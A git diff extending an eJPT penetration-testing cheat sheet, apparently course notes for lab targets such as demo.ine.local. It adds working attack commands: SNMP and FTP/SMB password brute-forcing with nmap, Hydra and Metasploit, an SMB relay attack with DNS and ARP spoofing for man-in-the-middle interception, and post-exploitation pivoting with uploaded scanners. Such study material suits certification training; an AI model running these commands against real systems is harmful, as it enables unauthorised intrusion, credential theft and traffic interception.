@@ -1,4 +1,5 @@
-# eJPT Cheat Sheet:
+## eJPT Cheat Sheet
+
 
 #### Find IP address of a website:
 
@@ -506,7 +507,7 @@ nmap <ip-address> -p 22 --script ssh-brute --script-args userdb=/root/user
 > Nmap can be also used to brute force user(s) password(s).
 
 ```msfconsole
-use /auciliary/scanner/ssh/ssh_login
+use /auxiliary/scanner/ssh/ssh_login
 show options
 set RHOST <ip-address>
 set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
@@ -1346,7 +1347,6 @@ shell
 /bin/bash -i
 chmod +x les.sh
 ./les.sh
-
 ```
 
 > This script works as the exploit suggester for linux.
@@ -1501,3 +1501,262 @@ dir K:
 ```
 
 > Command to load and access the shared resources.
+
+
+#### SNMP Enumeration:
+
+```Shell
+nmap -sU -p 161 <ip-address>
+```
+
+> We must keep in mind that **nmap** does not check for **UDP** ports by default. As we already know, **SNMP** runs on the **UDP** port **161**. So we have to run a special specific scan.
+
+```Shell
+nmap -sU -p 161 --script=snmp-brute <ip-address>
+```
+
+>  nmap `snmp-brute` script can be used to find the community string. The script uses the `snmpcommunities.lst` list for brute-forcing it is located inside `/usr/share/nmap/nselib/data/snmpcommunities.lst` directory.
+
+```Shell
+snmpwalk -v 1 -c public demo.ine.local
+```
+
+> `snmpwalk` tool can be used to find all the information via SNMP.
+
+`-v`: Specifies SNMP version to use.
+`-c`: Set the community string.
+
+```Shell
+nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
+```
+
+> The above command would run all the nmap SNMP scripts on the target machine and store its output to the`snmp_output`file.
+
+```Shell
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+```
+
+> After this `psexec` can be used to exploit the machine.
+
+#### SMB Relay Attack:
+
+```msfconsole
+use exploit/windows/smb/smb_relay
+show options
+set LHOST <our-ip-address>
+set SRVHOST <our-ip-address>
+set SMBHOST <target-ip-address>
+exploit
+jobs
+```
+
+> This will start the server up for the relay attack.
+
+```Shell
+echo "<our-ip-address> *.sportsfoo.com" > dns
+```
+
+> By this command we have created a fake kind of `DNS` file that can be used to spoof the DNS then.
+
+```Shell
+dnsspoof -i eth1 -f dns
+```
+
+> The command  uses the `dnsspoof` tool to intercept and spoof DNS queries on the network interface `eth1`, using the DNS in the `dns` file that we just created. This is used to attract all the traffic towards the attacker machine.
+
+```Shell
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+> This command can be used to enable ip-forwarding.
+
+```Shell
+arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
+arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
+```
+
+> The attacker positions themselves in the middle of the communication between `172.16.5.5` and `172.16.5.1`, enabling a Man-in-the-Middle (MitM) attack.
+
+***EXPLAINATION:***
+
+The commands use `arpspoof` to perform ARP spoofing, tricking the devices at IP addresses `172.16.5.5` and `172.16.5.1` into thinking the attacker's MAC address belongs to each other. This redirects the network traffic between these two devices through the attacker, enabling a Man-in-the-Middle (MitM) attack.
+
+#### Importing Nmap Scan Results Into MSF
+
+> Following set of commands can be used to import a scan into your `msfconsole`
+
+```msfconsole
+nmap -sV -Pn -oX my-scan.xml <ip-address>
+service postgresql start
+msfconsole -q
+db_status
+db_import my-scan.xml
+hosts
+services
+```
+
+#### Network Service Scanning
+
+***THIS IS DONE VIA PIVOTING AND EVERYTHING DEMOSTARTED UNDER IS DONE AFTER EXPLOITATION***
+
+```shell
+run autoroute -s <ip-address>
+```
+
+> This command can be used add the route to Metasploit's routing table.
+
+***Press CTRL+Z and Enter y to background the meterpreter session in order to run the following command***
+
+```msfconsole
+use auxiliary/scanner/portscan/tcp
+set RHOSTS demo2.ine.local
+set verbose false
+set ports 1-1000
+exploit
+```
+
+> This module can be used to run a portscan tcp module of Metasploit to scan the second target machine.
+
+```shell
+ls -al /usr/bin/nmap
+file /usr/bin/nmap
+```
+
+> Check the static binaries available in the `/usr/bin/` directory.
+
+```bash
+#!/bin/bash
+for port in {1..1000}; do
+ timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+done
+```
+
+> Using the script provided at https://catonmat.net/tcp-port-scanner-in-bash as a reference, create a bash script to scan the first 1000 ports
+
+```msfconsole
+sessions -i 1
+upload /usr/bin/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+```
+
+> Background the session and then upload the created shell script.
+
+```shell
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh demo2.ine.local
+```
+
+> Make the binary and script executable and use the bash script to scan the second target machine.
+
+#### FTP Enumeration:
+
+```msfconsole
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <ip-address>
+set verbose false
+set ports 1-1000
+exploit
+```
+
+> This module can be used to perform a simple port scan on the target machine.
+
+```msfconsole
+search type:auxiliary name:ftp
+use auxiliary/scanner/ftp/ftp_version
+set RHOST <ip-address>
+run
+```
+
+> This can be used to scan the FTP version running on the target.
+
+```msfconsole
+search type:auxiliary name:ftp
+use auxiliary/scanner/ftp/ftp_login
+set RHOST <ip-address>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+```
+
+> This module can be used to brute force FTP usernames and their respective passwords.
+
+```msfconsole
+search type:auxiliary name:ftp
+use auxiliary/scanner/ftp/anonymous
+set RHOSTS <ip-address>
+run
+```
+
+> This will check whether there is an anonymous login vulnerability.
+
+#### SMB Enumeration:
+
+```msfconsole
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_version
+set RHOSTS <ip-address>
+run
+```
+
+> This will give us the SMB version on the machine.
+
+```msfconsole
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_enumunsers
+set RHOSTS <ip-address>
+run
+```
+
+> It gives us all the users on the machine
+
+```msfconsole
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS <ip-address>
+set ShowFiles true
+run
+```
+
+> This will give all the shared files and shared details.
+
+```msfconsole
+search type:auxiliary name:smb
+use auxiliary/scanner/smb/smb_login
+set RHOSTS <ip-address>
+set SMBUser admin
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
+```
+
+> This module can be used to brute force the password for particular user `admin` in this case.
+
+```shell
+smbclient -L \\\\<ip-address>\\ -U admin
+```
+
+> After this command a prompt to enter the password will arrive and then after entering the correct password it will list down all the shared files and all.
+
+```Shell
+smbclient -L \\\\<ip-address>\\<share-name> -U admin
+smbclient -L \\\\192.168.33.42\\public -U admin
+```
+
+> This can be used to access are particular share.
+
+#### Web Server Enumeration:
+
+```msfconsole
+search type:auxiliary name:http
+use auxiliary/scanner/http/http_version
+set RHOTS <ip-address>
+run
+```
+
+> This is will give the `http` version running on the system.
+
+```msfconsole
+search type:auxiliary name:http
+use auxiliary/scanner/http/http_version
+```
